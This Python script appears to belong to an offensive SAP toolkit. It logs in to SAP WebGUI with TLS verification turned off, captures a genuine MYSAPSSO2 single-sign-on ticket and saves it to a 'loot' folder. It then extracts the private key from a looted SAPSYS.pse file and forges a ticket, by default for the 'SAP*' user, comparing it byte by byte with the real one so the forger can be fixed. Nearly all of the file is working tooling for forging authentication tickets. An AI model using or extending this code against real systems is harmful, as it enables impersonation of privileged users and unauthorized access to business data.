#!/usr/bin/env python3
"""Capture a genuine SAP-issued MYSAPSSO2 cookie via WebGUI logon.

Performs the normal SAP ICF form-based login (sap-user + sap-password
POST), captures the resulting `Set-Cookie: MYSAPSSO2=...` from SAP,
and dumps the ticket's full PKCS#7 structure side-by-side with what
our forger produces.

This is the apples-to-apples comparison we need to find what SAP
actually requires that our forger isn't doing.

Usage:
    python3 tools/capture_real_ticket.py \\
        --host 192.168.2.209 --port 8000 \\
        --client 001 --user DDIC --password '<password>'
"""
from __future__ import annotations

import argparse
import base64
import os
import ssl
import sys
import urllib.parse
import urllib.request

_TOOLS = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_TOOLS)
sys.path.insert(0, _ROOT)
import modules  # noqa: F401


def _hex_dump(data, prefix="", limit=0):
    out = []
    show = data if limit == 0 else data[:limit]
    for i in range(0, len(show), 16):
        chunk = show[i:i+16]
        hexp = " ".join(f"{b:02x}" for b in chunk)
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"{prefix}{i:04x}  {hexp:<48}  {text}")
    if limit and len(data) > limit:
        out.append(f"{prefix}...  ({len(data) - limit} more bytes)")
    return "\n".join(out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--client", required=True)
    ap.add_argument("--user", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument("--scheme", default="https")
    args = ap.parse_args()

    base = f"{args.scheme}://{args.host}:{args.port}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Modern SAP WebGUI requires POST form logon — credentials in the
    # URL aren't accepted by the lightspeed UI.  Flow:
    #   1. GET login page (captures XSRF token + initial cookies)
    #   2. Parse form action URL + hidden fields from the HTML
    #   3. POST with sap-user, sap-password, and all hidden fields
    #   4. Capture Set-Cookie: MYSAPSSO2= from the 302 response
    import http.cookiejar
    import re
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx),
    )

    # Step 1: GET the login form
    initial_url = (f"{base}/sap/bc/gui/sap/its/webgui?"
                   f"sap-client={args.client}")
    print(f"[*] Step 1: GET {initial_url}")
    req = urllib.request.Request(initial_url)
    try:
        with opener.open(req, timeout=15) as resp:
            status = resp.status
            login_html = resp.read().decode("utf-8", errors="replace")
            form_action_url = resp.url  # may have been redirected
    except urllib.error.HTTPError as e:
        status = e.code
        login_html = e.read().decode("utf-8", errors="replace") if e.fp else ""
        form_action_url = initial_url

    print(f"    HTTP {status}, {len(login_html)} body bytes")

    # Parse the hidden input fields (XSRF tokens, sap-system-login, etc.)
    hidden_fields = {}
    for m in re.finditer(
            r'<input\s+[^>]*type=["\']hidden["\'][^>]*?'
            r'name=["\']([^"\']+)["\']\s+[^>]*?'
            r'value=["\']([^"\']*)["\']', login_html, re.IGNORECASE):
        hidden_fields[m.group(1)] = m.group(2)
    # Also catch name first, value second
    for m in re.finditer(
            r'<input\s+name=["\']([^"\']+)["\']\s+'
            r'[^>]*?value=["\']([^"\']*)["\']'
            r'[^>]*?type=["\']hidden["\']',
            login_html, re.IGNORECASE):
        hidden_fields.setdefault(m.group(1), m.group(2))

    print(f"    Parsed {len(hidden_fields)} hidden form fields: "
          f"{list(hidden_fields.keys())}")

    # Extract the form action URL.  SAP HTML-entity-encodes the
    # slashes (`&#x2f;` for `/`) so we have to decode them first.
    import html as _html_mod
    form_action_match = re.search(
        r'<form[^>]*action=["\']([^"\']+)["\']', login_html,
        re.IGNORECASE)
    if form_action_match:
        action = _html_mod.unescape(form_action_match.group(1))
        if action.startswith("http"):
            post_url = action
        elif action.startswith("/"):
            post_url = f"{base}{action}"
        elif action == "" or action == "?":
            # Empty action means POST to the same URL we GET'd
            post_url = initial_url
        else:
            # Relative path — resolve against base
            post_url = f"{base}/sap/bc/gui/sap/its/{action.lstrip('/')}"
    else:
        post_url = initial_url
    # Add the sap-client query param if not present
    if "sap-client=" not in post_url:
        sep = "&" if "?" in post_url else "?"
        post_url = f"{post_url}{sep}sap-client={args.client}"
    print(f"    Form action: {post_url}")

    # Step 2: POST credentials
    print(f"\n[*] Step 2: POST credentials (user={args.user!r}) ...")
    form_data = dict(hidden_fields)
    form_data["sap-user"] = args.user
    form_data["sap-password"] = args.password
    form_data["sap-client"] = args.client
    form_data["sap-language"] = "EN"
    form_data["sap-system-login"] = "onLogin"

    post_body = urllib.parse.urlencode(form_data).encode("ascii")
    req2 = urllib.request.Request(
        post_url, data=post_body, method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 SAPMAP-ticket-capture",
        })
    try:
        with opener.open(req2, timeout=15) as resp:
            status = resp.status
            body = resp.read(2048)
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read(2048) if e.fp else b""

    print(f"    HTTP {status}, {len(body)} body bytes")
    print(f"[*] Cookies set by server:")
    real_mysapsso2 = None
    for cookie in jar:
        marker = "🎯" if cookie.name == "MYSAPSSO2" else "  "
        val_short = (cookie.value[:60] + "..."
                     if len(cookie.value) > 60 else cookie.value)
        print(f"    {marker} {cookie.name:25s} = {val_short}")
        if cookie.name == "MYSAPSSO2":
            real_mysapsso2 = cookie.value

    if not real_mysapsso2:
        print()
        print("[-] No MYSAPSSO2 cookie issued.")
        print("[-] Possible reasons:")
        print("    1. Wrong credentials (try DDIC / SAPADMIN / a user")
        print("       you've verified exists on this client)")
        print("    2. sap/login/accept_sso2_ticket=0 (SAP profile param)")
        print("    3. login/create_sso2_ticket=0 (different param)")
        print("    4. Client doesn't have SSO2 ticket creation enabled")
        print()
        print("Response body sample:")
        text = body.decode("utf-8", errors="replace")
        print(text[:600])
        return 1

    print()
    print("=" * 70)
    print("  🎯 SAP-ISSUED MYSAPSSO2 TICKET CAPTURED")
    print("=" * 70)
    print(f"  base64 length: {len(real_mysapsso2)} chars")

    # URL-decode if SAP URL-encoded the cookie value
    if "%" in real_mysapsso2:
        real_mysapsso2 = urllib.parse.unquote(real_mysapsso2)

    ticket_bytes = base64.b64decode(real_mysapsso2)
    print(f"  decoded length: {len(ticket_bytes)} bytes")
    print()
    print("First 128 bytes:")
    print(_hex_dump(ticket_bytes, prefix="  ", limit=128))

    # Save for offline analysis
    os.makedirs("loot/sap_real_tickets", exist_ok=True)
    with open("loot/sap_real_tickets/real_ticket_b64.txt", "w") as f:
        f.write(real_mysapsso2)
    with open("loot/sap_real_tickets/real_ticket.bin", "wb") as f:
        f.write(ticket_bytes)
    print()
    print(f"[+] Saved cookie+bytes to loot/sap_real_tickets/")

    # Parse with our parser
    from sap_mysapsso2 import parse_ticket
    parsed = parse_ticket(ticket_bytes)
    print()
    print("Parsed by our parser:")
    print(f"  magic        : 0x{parsed.get('magic', 0):02x}")
    print(f"  codepage     : {parsed.get('codepage')!r}")
    print(f"  user         : {parsed.get('user')!r}")
    print(f"  client       : {parsed.get('client')!r}")
    print(f"  sid          : {parsed.get('sid')!r}")
    print(f"  create_time  : {parsed.get('create_time')!r} "
          f"(len={len(parsed.get('create_time', ''))})")
    print(f"  validity_min : {parsed.get('validity_min')}")
    print(f"  language     : {parsed.get('language')!r}")
    print(f"  has_signature: {parsed.get('has_signature')}")
    print(f"  prefix_bytes : {len(parsed.get('prefix_bytes', b''))}B")
    print(f"  signature    : {len(parsed.get('signature_bytes', b''))}B")
    print()
    print("InfoUnits found in SAP's ticket:")
    for u in parsed.get("units", []):
        decoded = u.get("decoded", "")
        if len(str(decoded)) > 60:
            decoded = f"<{len(decoded)}B>"
        print(f"  id=0x{u['id']:02x} name={u['name']:14s} "
              f"raw={u['raw'][:32].hex()}... decoded={decoded!r}")

    # Compare with our forger
    print()
    print("=" * 70)
    print("  Differences vs our forged ticket")
    print("=" * 70)

    from sap_pse_loot import extract_signing_key
    from sap_mysapsso2 import forge_ticket

    with open("loot/pse/S4H_20260526_154249/SAPSYS.pse", "rb") as f:
        pse = f.read()
    keys = extract_signing_key(pse, "")
    our = forge_ticket(
        user=parsed.get("user") or "SAP*",
        client=parsed.get("client") or args.client,
        sid=parsed.get("sid") or "S4H",
        private_key=keys["private_key"],
        certificate=keys["certificate"],
        validity_min=parsed.get("validity_min") or 480,
        digest="sha1", include_cert=True)
    our_parsed = parse_ticket(our["ticket_bytes"])

    print(f"  ticket size : SAP={len(ticket_bytes)}  "
          f"ours={len(our['ticket_bytes'])}")
    print(f"  prefix size : SAP={len(parsed.get('prefix_bytes', b''))}  "
          f"ours={len(our_parsed.get('prefix_bytes', b''))}")
    print(f"  sig size    : "
          f"SAP={len(parsed.get('signature_bytes', b''))}  "
          f"ours={len(our_parsed.get('signature_bytes', b''))}")

    sap_ids = [u["id"] for u in parsed.get("units", [])]
    our_ids = [u["id"] for u in our_parsed.get("units", [])]
    print(f"\n  SAP InfoUnit IDs : {[hex(i) for i in sap_ids]}")
    print(f"  Our InfoUnit IDs : {[hex(i) for i in our_ids]}")
    extra = [hex(i) for i in our_ids if i not in sap_ids]
    missing = [hex(i) for i in sap_ids if i not in our_ids]
    if extra:
        print(f"  ✗ We send InfoUnits SAP doesn't: {extra}")
    if missing:
        print(f"  ✗ SAP sends InfoUnits we don't: {missing}")
    if not extra and not missing:
        print(f"  ✓ Same InfoUnit set")

    print()
    print("First 64B of each prefix (side by side):")
    print("  SAP : " + parsed.get("prefix_bytes", b"")[:64].hex())
    print("  Ours: " + our_parsed.get("prefix_bytes", b"")[:64].hex())

    print()
    print("First 64B of each SIGNATURE PKCS#7:")
    print("  SAP : " + parsed.get("signature_bytes", b"")[:64].hex())
    print("  Ours: " + our_parsed.get("signature_bytes", b"")[:64].hex())
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
